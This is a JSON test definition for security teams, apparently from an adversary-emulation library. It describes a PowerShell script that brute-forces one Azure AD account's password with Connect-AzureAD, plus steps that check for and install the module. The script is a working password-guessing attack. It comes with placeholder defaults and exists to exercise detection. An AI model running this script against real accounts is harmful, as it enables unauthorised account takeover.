{
  "id": "5a51ef57-299e-4d62-8e11-2d440df55e69",
  "name": "Brute Force Credentials of single Azure AD user",
  "description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n",
  "platforms": [
    "azure-ad"
  ],
  "steps": [
    {
      "id": "f163cb10-f175-45fa-a0b5-546e6b0c2db9",
      "type": "execute-command",
      "data": {
        "command": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2\u003e\u00261\u003e $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "08451f43-cf8a-4258-8e3e-1d31e0ece410",
      "name": "Check dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d630f7e8-7a75-444f-8ba7-19367ff4ba38",
      "name": "Resolve dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name AzureAD -Force\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b9b8ab37-06e2-4db8-bfbd-7a8349110f3c",
      "name": "Re-check dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "08451f43-cf8a-4258-8e3e-1d31e0ece410",
      "p": "on-success",
      "o": "f163cb10-f175-45fa-a0b5-546e6b0c2db9"
    },
    {
      "s": "08451f43-cf8a-4258-8e3e-1d31e0ece410",
      "p": "on-failure",
      "o": "d630f7e8-7a75-444f-8ba7-19367ff4ba38"
    },
    {
      "s": "d630f7e8-7a75-444f-8ba7-19367ff4ba38",
      "p": "on-success",
      "o": "b9b8ab37-06e2-4db8-bfbd-7a8349110f3c"
    },
    {
      "s": "b9b8ab37-06e2-4db8-bfbd-7a8349110f3c",
      "p": "on-failure",
      "o": "f163cb10-f175-45fa-a0b5-546e6b0c2db9"
    }
  ],
  "tags": [
    "T1110",
    "T1110.001"
  ],
  "input_arguments": [
    {
      "name": "username",
      "type": "string",
      "description": "Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg \"bruce.wayne@\u003cvalid_ms_account.com\u003e\"",
      "value": "bruce.wayne@contoso.com"
    },
    {
      "name": "passwords",
      "type": "string",
      "description": "List of passwords we will attempt to brute force with",
      "value": "Password1`n1q2w3e4r`nPassword!"
    }
  ]
}